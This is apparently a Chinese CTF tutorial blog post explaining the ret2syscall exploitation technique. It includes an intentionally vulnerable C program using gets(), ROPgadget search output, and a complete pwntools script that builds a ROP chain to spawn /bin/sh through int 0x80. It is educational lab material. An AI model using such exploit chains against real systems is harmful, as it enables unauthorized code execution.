---
title: ret2syscall攻击技术示例
time: 2017-08-03
tags: [CTF, pwn, stackoverflow]
layout: post
categories: posts
---

# 什么是ret2syscall

ret2syscall即return to system call，与ret2text和ret2shellcode类似，即在返回地址处进行*系统调用*，关于系统调用，可以阅读维基百科上的相关介绍——[系统调用](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)

> Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：
> 1. 应用程序调用库函数（API）；
> 2. API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；
> 3. 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；
> 4. 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；
> 5. 中断处理函数返回到 API 中；
> 6. API 将 EAX 返回给应用程序;
>
> 应用程序调用系统调用的过程是：
> 1. 把系统调用的编号存入 EAX；
> 2. 把函数参数存入其它通用寄存器；
> 3. 触发 0x80 号中断（int 0x80）。

# ret2syscall示例代码

``` c
#include <stdio.h>
#include <stdlib.h>

char *shell = "/bin/sh";

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("This time, no system() and NO SHELLCODE!!!\n");
    printf("What do you plan to do?\n");
    gets(buf);

    return 0;
}
```

本节示例的漏洞程序可以从此处下载：[ret2syscall](/files/ret2syscall)
# 漏洞分析

那么我们现在要通过系统调用执行以下命令获得一个shell
``` c
execve("/bin/sh", NULL, NULL)
```

那么很明显，我们需要完成的目标有如下：

* 获得execve的系统调用号
* 将execve的系统调用号赋给eax寄存器
* 将第一个参数"/bin/sh"的地址赋值给ebx寄存器
* 第二个参数NULL赋值给ecx寄存器
* 第三个参数NULL赋值给edx寄存器
* 触发 0x80 号中断(int 0x80)

关于各个函数的系统调用号，我们可以根据这个手册进行查询：[Linux Syscall Reference](http://syscalls.kernelgrok.com/)

我们可以查到execve的系统调用号为*0x0b*，而在系统调用时，eax是存放系统调用号，ebx,ecx,edx分别存放前3个参数，esi存放第4个参数，edi存放第5个参数，而Linux系统调用最多支持5个单独参数。如果实际参数超过5个，那么使用一个参数数组，并且将该数组的地址存放在ebx中。

那么我们如何将参数传递给各个寄存器呢？其实这里是利用到了 *ROP(Return-oriented programming)* 攻击技术，其实这是一种常见的代码复用技术，通过使用程序已有的机器指令(称之为gadget，注意，是机器指令)，来劫持程序控制流。

那么我们接下来就进行演示吧。我通常使用*ropgadget*来帮助搜索gadgets

首先是控制eax的gadget

``` bash
➜  ret2syscall ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

这里我们选择使用`pop eax ; ret`控制eax寄存器

```bash
0x080bb196 : pop eax ; ret
```

同理我们选择了下面这条gadgets，可以一次控制3个寄存器
``` bash
➜  ret2syscall ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx' | grep 'ecx' | grep 'edx'
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```
接下来我们要查询`"/bin/sh"`以及`int 0x80`的地址

``` bash
➜  ret2syscall ROPgadget --binary ret2syscall --string "/bin/sh"
Strings information
============================================================
0x080be408 : /bin/sh
➜  ret2syscall ROPgadget --binary ret2syscall --only 'int'
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```


通常我们gadget的利用方法是`address of gadget + param for register`，那么接下来我们可以构造对应参数进行系统调用

# 攻击代码

``` python
#encoding:utf-8
from pwn import *

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
bin_sh = 0x080be408
int_0x80 = 0x08049421

payload = 'A' * 112#用以往定位偏移的方法得到
payload += p32(pop_eax_ret) + p32(0x0b)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0x00) + p32(0x00) + p32(bin_sh)
payload +=p32(int_0x80)

io = process('ret2syscall')
io.sendline(payload)
io.interactive()
```

这样我们就通过控制寄存器传入参数，模拟了系统调用执行`execve("/bin/sh", NULL, NULL)`的过程
